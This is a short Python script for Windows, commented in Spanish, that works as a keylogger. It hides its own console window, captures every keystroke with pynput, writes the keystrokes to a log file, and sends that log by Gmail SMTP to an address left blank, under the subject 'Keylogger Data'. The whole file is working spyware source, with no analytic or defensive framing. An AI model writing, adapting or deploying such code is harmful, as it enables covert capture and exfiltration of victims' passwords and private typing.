import win32console
import win32gui 
import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana, 0)


log_file = open("log.txt", "w+")

def enviar_datos():
    msg = MIMEMultipart()
    password = "" #Clave
    msg['From'] = "" #Gmail
    msg['To'] = "" #Gmail
    msg['Subject'] = "Keylogger Data"
    msg.attach(MIMEText(open('log.txt').read())) 
    
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
    except:
        print("Error al enviar el correo") 

def presiona(key):
    key1 = convert(key)
    if key1 == "Key.esc": 
        print("Saliendo...")
        imprimir()
        return False
    elif key1 == "Key.space":
        lista_teclas.append(" ")
    elif key1 == "Key.enter":
        lista_teclas.append("\n")
    elif key1 == "Key.backspace":
        lista_teclas.pop()
    elif key1 == "Key.shift":
        pass
        
    elif key1 == "Key.ctrl":
        pass
        
    elif key1 == "Key.alt":
        pass
        
    else:
        lista_teclas.append(key1)


def imprimir():
    teclas = ''.join(lista_teclas)
    log_file.write(teclas)
    log_file.write("\n")
    log_file.close()
    time.sleep(5)
    enviar_datos()

lista_teclas = []

def convert(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

with pynput.keyboard.Listener(on_press=presiona) as listener:
    listener.join()